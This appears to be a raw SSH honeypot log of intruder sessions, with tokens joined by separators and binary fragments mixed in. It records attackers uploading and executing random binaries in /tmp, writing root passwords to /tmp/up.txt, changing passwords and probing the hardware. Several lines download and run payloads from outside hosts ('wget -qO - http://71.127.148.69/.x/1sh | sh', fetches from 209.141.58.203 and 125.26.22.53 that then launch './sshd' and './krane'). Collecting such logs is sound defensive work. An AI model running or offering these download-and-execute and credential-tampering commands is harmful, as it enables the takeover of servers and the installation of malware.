scp -|::|- -t -|::|- /tmp/wpAswCt9
rm -|::|- -rf -|::|- /var/tmp/dota*
3҉`e -|::|- echo -|::|- "root -|::|- Root123" -|::|- > -|::|- /tmp/up.txt -|::|- 3҉`v~
scp -|::|- -t -|::|- /tmp/cimszosn
[email] -|::|- linux -|::|- node:~$ -|::|- [email] -|::|- linux -|::|- node:~$ -|::|- Linux -|::|- pouta.csc -|::|- linux -|::|- node -|::|- 5.4.0-70-generic -|::|- #78-Ubuntu -|::|- SMP -|::|- Fri -|::|- Mar -|::|- 19 -|::|- 13:29:52 -|::|- UTC -|::|- 2021 -|::|- x86_64 -|::|- GNU/Linux -|::|- [email] -|::|- linux -|::|- node:~$ -|::|- [email] -|::|- linux -|::|- node:~$ -|::|- [email] -|::|- linux -|::|- node:/tmp$ -|::|- . -|::|- .. -|::|- .ICE-unix -|::|- .Test-unix -|::|- .X11-unix -|::|- .XIM-unix -|::|- .font-unix -|::|- snap.lxd -|::|- systemd-private-3c87d3b61018479fbd86989e4ab9921a-systemd-logind.service-HBlekf -|::|- systemd-private-3c87d3b61018479fbd86989e4ab9921a-systemd-resolved.service-eGkCdj -|::|- systemd-private-3c87d3b61018479fbd86989e4ab9921a-systemd-timesyncd.service-x4eSxi -|::|- [email] -|::|- linux -|::|- node:/tmp$
cat -|::|- /proc/cpuinfo -|::|- | -|::|- grep -|::|- name -|::|- | -|::|- head -|::|- -n -|::|- 1 -|::|- | -|::|- awk -|::|- '{print -|::|- $4,$5,$6,$7,$8,$9;}' -|::|- Intel(R) -|::|- Core(TM)2 -|::|- Duo -|::|- CPU -|::|- E8200 -|::|- @
scp -|::|- -t -|::|- /tmp/IhjJXTMA
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- sBFj54JU -|::|- && -|::|- bash -|::|- -c -|::|- ./sBFj54JU -|::|- -bash: -|::|- ./sBFj54JU: -|::|- command -|::|- not -|::|- found
cat -|::|- /proc/cpuinfo -|::|- | -|::|- grep -|::|- name -|::|- | -|::|- wc -|::|- -l
u!`v -|::|- cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- q80t6JBH -|::|- && -|::|- bash -|::|- -c -|::|- ./q80t6JBH -|::|- u!`5 -|::|- -bash: -|::|- ./q80t6JBH: -|::|- command -|::|- not -|::|- found
-bash: -|::|- top: -|::|- command -|::|- not -|::|- found
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- 2Sb5fAJ0 -|::|- && -|::|- bash -|::|- -c -|::|- ./2Sb5fAJ0 -|::|- -bash: -|::|- ./2Sb5fAJ0: -|::|- command -|::|- not -|::|- found
cat -|::|- /proc/cpuinfo -|::|- processor -|::|- vendor_id -|::|- : -|::|- GenuineIntel -|::|- cpu -|::|- family -|::|- model -|::|- : -|::|- 23 -|::|- model -|::|- name -|::|- : -|::|- Intel(R) -|::|- Core(TM)2 -|::|- Duo -|::|- CPU -|::|- E8200 -|::|- @ -|::|- 2.66GHz -|::|- stepping -|::|- cpu -|::|- MHz -|::|- : -|::|- 2133.304 -|::|- cache -|::|- size -|::|- : -|::|- 6144 -|::|- KB -|::|- physical -|::|- id -|::|- siblings -|::|- core -|::|- id -|::|- cpu -|::|- cores -|::|- apicid -|::|- initial -|::|- apicid -|::|- : -|::|- yes -|::|- fpu_exception -|::|- : -|::|- yes -|::|- cpuid -|::|- level -|::|- : -|::|- 10 -|::|- : -|::|- yes -|::|- flags -|::|- : -|::|- fpu -|::|- vme -|::|- de -|::|- pse -|::|- tsc -|::|- msr -|::|- pae -|::|- mce -|::|- cx8 -|::|- apic -|::|- sep -|::|- mtrr -|::|- pge -|::|- mca -|::|- cmov -|::|- pat -|::|- pse36 -|::|- clflush -|::|- dts -|::|- acpi -|::|- mmx -|::|- fxsr -|::|- sse -|::|- sse2 -|::|- ss -|::|- ht -|::|- tm -|::|- pbe -|::|- syscall -|::|- nx -|::|- lm -|::|- constant_tsc -|::|- arch_perfmon -|::|- pebs -|::|- bts -|::|- rep_good -|::|- pni -|::|- monitor -|::|- ds_cpl -|::|- vmx -|::|- smx -|::|- est -|::|- tm2 -|::|- ssse3 -|::|- cx16 -|::|- xtpr -|::|- sse4_1 -|::|- lahf_lm -|::|- bogomips -|::|- : -|::|- 4270.03 -|::|- clflush -|::|- size -|::|- : -|::|- 64 -|::|- cache_alignment -|::|- : -|::|- 64 -|::|- address -|::|- sizes -|::|- : -|::|- 36 -|::|- bits -|::|- physical, -|::|- 48 -|::|- bits -|::|- virtual -|::|- power -|::|- management: -|::|- processor -|::|- vendor_id -|::|- : -|::|- GenuineIntel -|::|- cpu -|::|- family -|::|- model -|::|- : -|::|- 23 -|::|- model -|::|- name -|::|- : -|::|- Intel(R) -|::|- Core(TM)2 -|::|- Duo -|::|- CPU -|::|- E8200 -|::|- @ -|::|- 2.66GHz -|::|- stepping -|::|- cpu -|::|- MHz -|::|- : -|::|- 2133.304 -|::|- cache -|::|- size -|::|- : -|::|- 6144 -|::|- KB -|::|- physical -|::|- id -|::|- siblings -|::|- core -|::|- id -|::|- cpu -|::|- cores -|::|- apicid -|::|- initial -|::|- apicid -|::|- : -|::|- yes -|::|- fpu_exception -|::|- : -|::|- yes -|::|- cpuid -|::|- level -|::|- : -|::|- 10 -|::|- : -|::|- yes -|::|- flags -|::|- : -|::|- fpu -|::|- vme -|::|- de -|::|- pse -|::|- tsc -|::|- msr -|::|- pae -|::|- mce -|::|- cx8 -|::|- apic -|::|- sep -|::|- mtrr -|::|- pge -|::|- mca -|::|- cmov -|::|- pat -|::|- pse36 -|::|- clflush -|::|- dts -|::|- acpi -|::|- mmx -|::|- fxsr -|::|- sse -|::|- sse2 -|::|- ss -|::|- ht -|::|- tm -|::|- pbe -|::|- syscall -|::|- nx -|::|- lm -|::|- constant_tsc -|::|- arch_perfmon -|::|- pebs -|::|- bts -|::|- rep_good -|::|- pni -|::|- monitor -|::|- ds_cpl -|::|- vmx -|::|- smx -|::|- est -|::|- tm2 -|::|- ssse3 -|::|- cx16 -|::|- xtpr -|::|- sse4_1 -|::|- lahf_lm -|::|- bogomips -|::|- : -|::|- 4266.61 -|::|- clflush -|::|- size -|::|- : -|::|- 64 -|::|- cache_alignment -|::|- : -|::|- 64 -|::|- address -|::|- sizes -|::|- : -|::|- 36 -|::|- bits -|::|- physical, -|::|- 48 -|::|- bits -|::|- virtual -|::|- power -|::|- management:
jQ`S -|::|- echo -|::|- "root -|::|- temp123" -|::|- > -|::|- /tmp/up.txt -|::|- jQ`Ճ
D#`D -|::|- echo -|::|- "root -|::|- abcd-1234 -|::|- " -|::|- > -|::|- /tmp/up.txt -|::|- D#`?
GQ`C -|::|- cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- Gejkgvqi -|::|- && -|::|- bash -|::|- -c -|::|- ./Gejkgvqi -|::|- GQ` -|::|- -bash: -|::|- ./Gejkgvqi: -|::|- command -|::|- not -|::|- found
3`G- -|::|- cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- JgxvyD7y -|::|- && -|::|- bash -|::|- -c -|::|- ./JgxvyD7y -|::|- -bash: -|::|- ./JgxvyD7y: -|::|- command -|::|- not -|::|- found -|::|- 3`h:
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- iXBLMgmb -|::|- && -|::|- bash -|::|- -c -|::|- ./iXBLMgmb -|::|- -bash: -|::|- ./iXBLMgmb: -|::|- command -|::|- not -|::|- found
scp -|::|- -t -|::|- /tmp/5obYfVTI -|::|- >`&A -|::|- >`UA -|::|- >`AB
[email] -|::|- linux -|::|- node:~$ -|::|- v`I] -|::|- -bash: -|::|- top: -|::|- command -|::|- not -|::|- found -|::|- [email] -|::|- linux -|::|- node:~$ -|::|- x`.D -|::|- x`'N -|::|- -bash: -|::|- nproc: -|::|- command -|::|- not -|::|- found -|::|- x`aO -|::|- [email] -|::|- linux -|::|- node:~$ -|::|- x`Ih -|::|- y`_b -|::|- y`{. -|::|- y`x2 -|::|- [email] -|::|- linux -|::|- node:/dev/shm$ -|::|- {`ky -|::|- {`U7 -|::|- {`kQ -|::|- {`[V -|::|- wget: -|::|- missing -|::|- URL -|::|- Usage: -|::|- wget -|::|- [OPTION]... -|::|- [URL]... -|::|- Try -|::|- `wget -|::|- --help' -|::|- for -|::|- more -|::|- options. -|::|- {`QW -|::|- [email] -|::|- linux -|::|- node:/dev/shm$ -|::|- curl: -|::|- try -|::|- 'curl -|::|- --help' -|::|- or -|::|- 'curl -|::|- --manual' -|::|- for -|::|- more -|::|- information -|::|- [email] -|::|- linux -|::|- node:/dev/shm$ -|::|- }`1# -|::|- ~`%E -|::|- ~`(F -|::|- ~`I2 -|::|- --2021-05-13 -|::|- 04:01:04-- -|::|- http://krane.ddns.net/krax -|::|- Connecting -|::|- to -|::|- krane.ddns.net:80... -|::|- connected. -|::|- HTTP -|::|- request -|::|- sent, -|::|- awaiting -|::|- response... -|::|- 200 -|::|- OK -|::|- Length: -|::|- 3096097 -|::|- (2M) -|::|- [text/whatever] -|::|- Saving -|::|- to: -|::|- `/dev/shm/krax' -|::|- 0% -|::|- [> -|::|- ] -|::|- 5,322 -|::|- 14K/s -|::|- eta -|::|- 3m -|::|- 36s -|::|- 5% -|::|- [=> -|::|- ] -|::|- 174,658 -|::|- 179K/s -|::|- eta -|::|- 16s -|::|- 46% -|::|- [=================> -|::|- ] -|::|- 1,443,290 -|::|- 917K/s -|::|- eta -|::|- 1s -|::|- 100%[======================================>] -|::|- 3,096,097 -|::|- 917K/s -|::|- 2021-05-13 -|::|- 04:01:06 -|::|- (917 -|::|- KB/s) -|::|- - -|::|- `/dev/shm/krax' -|::|- saved -|::|- [3096097/3096097] -|::|- [email] -|::|- linux -|::|- node:/dev/shm$ -|::|- ._lul -|::|- ._lul/krn -|::|- ._lul/krane -|::|- ._lul/config.json -|::|- [email] -|::|- linux -|::|- node:/dev/shm$ -|::|- cd -|::|- ._lul/ -|::|- [email] -|::|- linux -|::|- node:/dev/shm/._lul$ -|::|- -bash: -|::|- sl: -|::|- command -|::|- not -|::|- found -|::|- [email] -|::|- linux -|::|- node:/dev/shm/._lul$ -|::|- -bash: -|::|- ./krn: -|::|- command -|::|- not -|::|- found -|::|- [email] -|::|- linux -|::|- node:/dev/shm/._lul$ -|::|- config.json -|::|- krane -|::|- krn -|::|- [email] -|::|- linux -|::|- node:/dev/shm/._lul$ -|::|- [email] -|::|- linux -|::|- node:/dev/shm/._lul$ -|::|- -bash: -|::|- ./krn: -|::|- command -|::|- not -|::|- found -|::|- [email] -|::|- linux -|::|- node:/dev/shm/._lul$ -|::|- -bash: -|::|- ./krane: -|::|- command -|::|- not -|::|- found -|::|- [email] -|::|- linux -|::|- node:/dev/shm/._lul$ -|::|- [email] -|::|- linux -|::|- node:/dev/shm/._lul$ -|::|- [email] -|::|- linux -|::|- node:/dev/shm$ -|::|- [email] -|::|- linux -|::|- node:/dev/shm$ -|::|- [email] -|::|- linux -|::|- node:/dev/shm$

scp -|::|- -t -|::|- /tmp/4VwfB463 -|::|- \`#k -|::|- \`"l -|::|- \`]l
<`]E -|::|- echo -|::|- "root -|::|- P455w0rd" -|::|- > -|::|- /tmp/up.txt
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- tzE6ezMO -|::|- && -|::|- bash -|::|- -c -|::|- ./tzE6ezMO -|::|- -bash: -|::|- ./tzE6ezMO: -|::|- command -|::|- not -|::|- found
echo -|::|- "root -|::|- P@ssw0rd@1" -|::|- > -|::|- /tmp/up.txt
1c`~ -|::|- 1c`r -|::|- scp -|::|- -t -|::|- /tmp/nLXjxExB -|::|- 1c`ƅ -|::|- 1c`5 -|::|- 1c`b -|::|- 1c`P
ifconfig -|::|- eth0 -|::|- Link -|::|- encap:Ethernet -|::|- HWaddr -|::|- 67:c1:6c:a4:cc:3f -|::|- inet -|::|- addr:192.168.1.12 -|::|- Bcast:192.168.1.255 -|::|- Mask:255.255.255.0 -|::|- inet6 -|::|- addr: -|::|- fe23::28e:43ff:fe59:9601/64 -|::|- Scope:Link -|::|- UP -|::|- BROADCAST -|::|- RUNNING -|::|- MULTICAST -|::|- MTU:1500 -|::|- Metric:1 -|::|- RX -|::|- packets:544420 -|::|- errors:0 -|::|- dropped:0 -|::|- overruns:0 -|::|- frame:0 -|::|- TX -|::|- packets:505216 -|::|- errors:0 -|::|- dropped:0 -|::|- overruns:0 -|::|- carrier:0 -|::|- collisions:0 -|::|- txqueuelen:1000 -|::|- RX -|::|- bytes:486084848 -|::|- (486.1 -|::|- MB) -|::|- TX -|::|- bytes:39244038 -|::|- (39.2 -|::|- MB) -|::|- lo -|::|- Link -|::|- encap:Local -|::|- Loopback -|::|- inet -|::|- addr:127.0.0.1 -|::|- Mask:255.0.0.0 -|::|- inet6 -|::|- addr: -|::|- ::1/128 -|::|- Scope:Host -|::|- UP -|::|- LOOPBACK -|::|- RUNNING -|::|- MTU:65536 -|::|- Metric:1 -|::|- RX -|::|- packets:110 -|::|- errors:0 -|::|- dropped:0 -|::|- overruns:0 -|::|- frame:0 -|::|- TX -|::|- packets:110 -|::|- errors:0 -|::|- dropped:0 -|::|- overruns:0 -|::|- carrier:0 -|::|- collisions:0 -|::|- txqueuelen:0 -|::|- RX -|::|- bytes:36825903 -|::|- (36.8 -|::|- MB) -|::|- TX -|::|- bytes:36825903 -|::|- (36.8 -|::|- MB)
echo -|::|- "root -|::|- admin32 -|::|- " -|::|- > -|::|- /tmp/up.txt -|::|- &`dw
uptime -|::|- 05:45:21 -|::|- up -|::|- 4 -|::|- days, -|::|- 9:57, -|::|- 1 -|::|- user, -|::|- load -|::|- average: -|::|- 0.00, -|::|- 0.00, -|::|- 0.00
EQ`@ -|::|- EQ`I -|::|- scp -|::|- -t -|::|- /tmp/Gejkgvqi -|::|- EQ`{ -|::|- EQ`+ -|::|- EQ`d
scp -|::|- -t -|::|- /tmp/FsfufM4B -|::|- /`V? -|::|- /`(@ -|::|- /`i@ -|::|- /`+A -|::|- /`XA
echo -|::|- "qwer`123\n20cBaYmtZ6ev\n20cBaYmtZ6ev\n"|passwd -|::|- -bash: -|::|- syntax -|::|- error: -|::|- unexpected -|::|- end -|::|- of -|::|- file
;`PE -|::|- echo -|::|- "root -|::|- !@#cnidc" -|::|- > -|::|- /tmp/up.txt
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- 8Iv1YM0T -|::|- && -|::|- bash -|::|- -c -|::|- ./8Iv1YM0T -|::|- -bash: -|::|- ./8Iv1YM0T: -|::|- command -|::|- not -|::|- found
echo -|::|- "qwer`123\nf5j4hCWTLakZ\nf5j4hCWTLakZ\n"|passwd -|::|- -bash: -|::|- syntax -|::|- error: -|::|- unexpected -|::|- end -|::|- of -|::|- file
wu`G -|::|- cd -|::|- /tmp -|::|- || -|::|- cd -|::|- /var/run -|::|- || -|::|- cd -|::|- /mnt -|::|- || -|::|- cd -|::|- /root -|::|- || -|::|- cd -|::|- /; -|::|- wget -|::|- 209.141.58.203/ssh -|::|- || -|::|- curl -|::|- -o -|::|- ssh -|::|- 209.141.58.203/ssh; -|::|- tar -|::|- xvf -|::|- ssh; -|::|- cd -|::|- .ssh; -|::|- chmod -|::|- +x -|::|- *; -|::|- ./sshd; -|::|- ./krane -|::|- admin -|::|- --2021-05-15 -|::|- 07:17:11-- -|::|- http://209.141.58.203/ssh -|::|- Connecting -|::|- to -|::|- 209.141.58.203:80... -|::|- connected. -|::|- HTTP -|::|- request -|::|- sent, -|::|- awaiting -|::|- response... -|::|- wu`} -|::|- 200 -|::|- OK -|::|- wu`З -|::|- Length: -|::|- 3095989 -|::|- (2M) -|::|- [text/whatever] -|::|- wu`" -|::|- Saving -|::|- to: -|::|- `/ssh' -|::|- wu`̘ -|::|- 0% -|::|- [> -|::|- ] -|::|- 13,650 -|::|- 31K/s -|::|- eta -|::|- 1m -|::|- 36s -|::|- xu`_ -|::|- 5% -|::|- [=> -|::|- ] -|::|- 163,554 -|::|- 150K/s -|::|- eta -|::|- 19s -|::|- yu`X -|::|- 24% -|::|- [=========> -|::|- ] -|::|- 766,770 -|::|- 471K/s -|::|- eta -|::|- 4s -|::|- 62% -|::|- [========================> -|::|- ] -|::|- 1,945,746 -|::|- 871K/s -|::|- eta -|::|- 1s -|::|- zu`Y -|::|- 89% -|::|- [==================================> -|::|- ] -|::|- 2,763,578 -|::|- 991K/s -|::|- eta -|::|- 0s -|::|- zu`< -|::|- 100%[======================================>] -|::|- 3,095,989 -|::|- 991K/s -|::|- 2021-05-15 -|::|- 07:17:14 -|::|- (991 -|::|- KB/s) -|::|- - -|::|- `/ssh' -|::|- saved -|::|- [3095989/3095989] -|::|- zu`> -|::|- % -|::|- Total -|::|- % -|::|- Received -|::|- % -|::|- Xferd -|::|- Average -|::|- Speed -|::|- Time -|::|- Time -|::|- Time -|::|- Current -|::|- zu`r -|::|- Dload -|::|- Upload -|::|- Total -|::|- Spent -|::|- Left -|::|- Speed -|::|- |u`~ -|::|- 100 -|::|- 3095989.0 -|::|- 100 -|::|- 3095989.0 -|::|- 0 -|::|- 0 -|::|- 63673 -|::|- 0 -|::|- --:--:-- -|::|- --:--:-- -|::|- --:--:-- -|::|- 65181 -|::|- |u`}/ -|::|- .ssh -|::|- |u`0 -|::|- .ssh/config.json -|::|- |u`(1 -|::|- .ssh/sshd -|::|- |u`L. -|::|- .ssh/krane -|::|- |u`+3 -|::|- -bash: -|::|- ./sshd: -|::|- command -|::|- not -|::|- found -|::|- |u`4 -|::|- -bash: -|::|- ./krane: -|::|- command -|::|- not -|::|- found
scp -|::|- -t -|::|- /tmp/JgxvyD7y
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- 4nJFYqXl -|::|- && -|::|- bash -|::|- -c -|::|- ./4nJFYqXl -|::|- -bash: -|::|- ./4nJFYqXl: -|::|- command -|::|- not -|::|- found
^+`j -|::|- echo -|::|- "root -|::|- 25umet#2^10 -|::|- " -|::|- > -|::|- /tmp/up.txt
scp -|::|- -t -|::|- /tmp/29e15QrH
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- b1OxqJDe -|::|- && -|::|- bash -|::|- -c -|::|- ./b1OxqJDe -|::|- -bash: -|::|- ./b1OxqJDe: -|::|- command -|::|- not -|::|- found
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- q1H3J2X7 -|::|- && -|::|- bash -|::|- -c -|::|- ./q1H3J2X7 -|::|- -bash: -|::|- ./q1H3J2X7: -|::|- command -|::|- not -|::|- found
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- XxUaqqOB -|::|- && -|::|- bash -|::|- -c -|::|- ./XxUaqqOB -|::|- -bash: -|::|- ./XxUaqqOB: -|::|- command -|::|- not -|::|- found
echo -|::|- "root -|::|- rootpassword" -|::|- > -|::|- /tmp/up.txt
7g`Q -|::|- 7g`S -|::|- cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- M01GZwRG -|::|- && -|::|- bash -|::|- -c -|::|- ./M01GZwRG -|::|- 7g`<b -|::|- -bash: -|::|- ./M01GZwRG: -|::|- command -|::|- not -|::|- found -|::|- 7g`e
wget -|::|- -qO -|::|- - -|::|- http://71.127.148.69/.x/1sh -|::|- | -|::|- sh -|::|- > -|::|- /dev/null -|::|- 2>&1 -|::|- &
free -|::|- -m -|::|- | -|::|- grep -|::|- Mem -|::|- | -|::|- awk -|::|- '{print -|::|- $2 -|::|- ,$3, -|::|- $4, -|::|- $5, -|::|- $6, -|::|- $7}' -|::|- 16010 -|::|- 728 -|::|- 10380 -|::|- 1 -|::|- 4901 -|::|- 15386
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- UzwmZBx0 -|::|- && -|::|- bash -|::|- -c -|::|- ./UzwmZBx0 -|::|- -bash: -|::|- ./UzwmZBx0: -|::|- command -|::|- not -|::|- found
cat -|::|- /etc/issue; -|::|- Debian -|::|- GNU/Linux -|::|- 7 -|::|- \n -|::|- \l
C`:} -|::|- #!/bin/sh -|::|- PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin -|::|- wget -|::|- http://125.26.22.53/scripts/23 -|::|- curl -|::|- -O -|::|- http://125.26.22.53/scripts/23 -|::|- chmod -|::|- +x -|::|- 23 -|::|- ./23 -|::|- wget -|::|- http://125.26.22.53/scripts/23s -|::|- curl -|::|- -O -|::|- http://125.26.22.53/scripts/23s -|::|- chmod -|::|- +x -|::|- 23s -|::|- ./23s -|::|- rm -|::|- -rf -|::|- 23.sh
echo -|::|- "root -|::|- busy -|::|- " -|::|- > -|::|- /tmp/up.txt
echo -|::|- 'root:root'>/tmp/up.txt
3%`` -|::|- echo -|::|- "root -|::|- clear!@# -|::|- " -|::|- > -|::|- /tmp/up.txt -|::|- 3%`Co
c`0l -|::|- cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- V1Y2k0gD -|::|- && -|::|- bash -|::|- -c -|::|- ./V1Y2k0gD -|::|- -bash: -|::|- ./V1Y2k0gD: -|::|- command -|::|- not -|::|- found -|::|- c`Uz
!`gK -|::|- !`bL -|::|- scp -|::|- -t -|::|- /tmp/UzwmZBx0 -|::|- !`qR -|::|- !`DS -|::|- !`pS -|::|- !`QW
scp -|::|- -t -|::|- /tmp/2wwZXGjq
